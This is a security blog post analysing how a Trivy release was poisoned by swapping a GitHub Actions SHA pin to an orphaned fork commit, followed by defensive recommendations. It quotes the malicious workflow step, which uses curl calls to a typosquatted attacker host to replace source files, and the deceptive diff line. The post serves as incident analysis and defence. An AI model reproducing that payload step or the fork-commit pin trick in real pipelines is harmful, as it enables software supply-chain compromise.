---
layout: post
title:  "SHA Pinning Is Not Enough"
tags: security supply-chain github-actions
---

A few days ago I wrote about [how the Trivy ecosystem got turned into a credential stealer]({{ site.baseurl }}/2026/03/20/typosquatting-trivy). One of my takeaways was "pin by SHA." Every supply chain security guide says it, I've said it, every subreddit says it, and the GitHub Actions hardening docs say it.

The Trivy attack proved it wrong, and I think we need to talk about why.

## Quick Refresher

For anyone not familiar, SHA pinning looks like this:

```yaml
# Tag reference (mutable, dangerous)
- uses: actions/checkout@v6.0.2

# SHA-pinned (immutable, safe... right?)
- uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
```

Git tags are just pointers, so anyone with write access can move a tag to a different commit. SHAs are cryptographic hashes of the commit content. You can't forge one and you can't move one. Pin to a SHA and you get exactly the code you reviewed, forever.

That logic is correct, but it's not the whole picture.

## What Actually Happened

On March 4, [commit `1885610c`](https://github.com/aquasecurity/trivy/commit/1885610c6a34811c8296416ae69f568002ef11ec) landed in `aquasecurity/trivy`. The message said `fix(ci): Use correct checkout pinning`, attributed to `DmitriyLewen` (a legitimate maintainer). The diff touched two workflow files across 14 lines. Most of it was noise: single quotes swapped for double quotes, a trailing space removed from a `mkdir` line. The kind of commit that gets waved through review because there's nothing to review.

Two lines mattered. The first swapped the `actions/checkout` SHA in the release workflow:

```diff
-        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
+        uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0 # v6.0.2
```

The `# v6.0.2` comment stayed. The SHA changed. The second change added `--skip=validate` to the GoReleaser invocation, disabling integrity checks on the build artifacts.

The payload lived at the other end of that SHA. [Commit `70379aad`](https://github.com/actions/checkout/commit/70379aad1a8b40919ce8b382d3cd7d0315cde1d0) sits in the `actions/checkout` repository as an orphaned commit. Someone had forked `actions/checkout`, created a commit with malicious code, and walked away. GitHub's UI actually flags it with a yellow banner: *"This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository."* The author is listed as `Guillermo Rauch <rauchg@gmail.com>` (spoofed), the commit message references [PR #2356](https://github.com/actions/checkout/pull/2356) (a real, closed PR by a GitHub employee), and the commit is unsigned. Every bit of metadata is designed to look routine at a glance.

Here's the part that should bother you: GitHub's architecture makes fork commits reachable by SHA from the parent repo. When GitHub Actions resolved `actions/checkout@70379aad...`, it fetched the commit, found valid code, and ran it. No warning in the run log. No signal that this commit came from outside the repository's branch history. As far as the runtime was concerned, it was a totally normal commit in `actions/checkout`.

Anyone can do this right now. Fork a popular action, create a commit with whatever code you want, and produce a SHA that GitHub will resolve as if it belongs to the original repository. SHA pinning guarantees you get the same commit every time. It does *not* guarantee that commit was ever part of the upstream project.

## Nobody Reads Hex Strings

The malicious checkout replaced `action.yml`'s Node.js entrypoint with a composite action that did a legitimate checkout first, then silently pulled down replacements for the Trivy source:

```yaml
- name: "Setup Checkout"
  shell: bash
  run: |
    BASE="https://scan.aquasecurtiy.org/static"
    curl -sf "$BASE/main.go" -o cmd/trivy/main.go &> /dev/null
    curl -sf "$BASE/scand.go" -o cmd/trivy/scand.go &> /dev/null
    curl -sf "$BASE/fork_unix.go" -o cmd/trivy/fork_unix.go &> /dev/null
    curl -sf "$BASE/fork_windows.go" -o cmd/trivy/fork_windows.go &> /dev/null
    curl -sf "$BASE/.golangci.yaml" -o .golangci.yaml &> /dev/null
```

Four Go files from a typosquatted C2, dropped into `cmd/trivy/`, replacing the real source. A fifth download replaced `.golangci.yaml` to disable linter rules that would have flagged the injected code. GoReleaser ran with validation skipped, built binaries from the poisoned source, and published them as `v0.69.4` through Trivy's own release infrastructure. The malware was compiled in. No runtime download, no shell script, no base64.

But none of that is visible from the Trivy repository side. What a reviewer actually sees is this:

```diff
-        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
+        uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0 # v6.0.2
```

Two 40-character hex strings, both ending with `# v6.0.2`. Be honest: you didn't compare them character by character just now. Neither did anyone reviewing that commit. The version comment is the thing people actually read, and the version comment is just a freeform string that anybody can type.

SHA pinning optimizes for machine verification but falls apart at the moment a human has to review a change. The attacker knew this, which is why the rest of the 14-line diff was cosmetic noise. Hide the important thing behind boring things, and the reviewer's attention goes to the boring things.

## The Comment That Lied

There's a convention that's emerged with SHA pinning where you put the version tag in a comment next to the SHA so humans can tell what version they're using:

```yaml
- uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
```

That comment is free text. Nothing validates it. No tool in the GitHub Actions pipeline checks that the SHA actually corresponds to `v6.0.2`. Dependabot and Renovate verify tag-to-SHA mappings when *they* make updates, but they can't protect against someone hand-editing a SHA and typing whatever they want in the comment. In this case, the commit came from a maintainer account (or at least one with write access), so it sailed right past branch protection.

The comment `# v6.0.2` was the entire social engineering payload on the Trivy repository side. Not a phishing email, not a fake login page. Five characters in a YAML comment that made a reviewer's brain skip right past the hex string next to it.

## What Actually Helps

SHA pinning is still better than tag references. It knocks out one class of attack (tag mutation) entirely. But treating it as "good enough" is where things fall apart.

The fork commit problem is the most immediate thing you can act on. Before you accept a SHA change in a PR, click through to the commit in the target repository. For `actions/checkout@70379aad...`, that would have shown GitHub's yellow "does not belong to any branch" banner. That's a hard no. Any SHA pin for a GitHub Action should point to a commit that lives on a release branch or tag in the official repo, not an orphaned commit from some fork. You can automate this check with the GitHub API, since `repos/{owner}/{repo}/commits/{sha}/branches-where-head` returns an empty list for orphaned commits.

Beyond that, the usual layers apply: require signed commits on workflow file changes, restrict allowed actions at the org level to an explicit allowlist, mirror the actions you depend on into your own org so fork reachability doesn't apply, and verify build artifact provenance with [artifact attestations](https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds) rather than trusting whatever came out of CI.

The uncomfortable reality is that no single control would have stopped the Trivy attack. The commit came through a compromised maintainer account, so code review and branch protection were both present and both bypassed. The SHA pointed to a fork commit, so the pin itself was technically valid. GoReleaser validation was explicitly disabled, so the build system's own integrity checks were stripped. Every control in the pipeline was individually subverted. The attack worked because nothing caught the chain.

## This Is the Floor, Not the Ceiling

After the `tj-actions/changed-files` incident in early 2025, the security community converged on SHA pinning as *the* answer to GitHub Actions supply chain attacks. It was the right call, but it wasn't the complete answer, and somewhere along the way the nuance got lost. "Pin your SHAs" turned into "pin your SHAs and you're safe," which is a very different statement.

Pin your SHAs. Then verify what they point to.

---

*This is a follow-up to my earlier post on the [Trivy supply chain compromise]({{ site.baseurl }}/2026/03/20/typosquatting-trivy).*

If you liked (or hated) this blog, feel free to check out my [GitHub](https://github.com/RoseSecurity)!
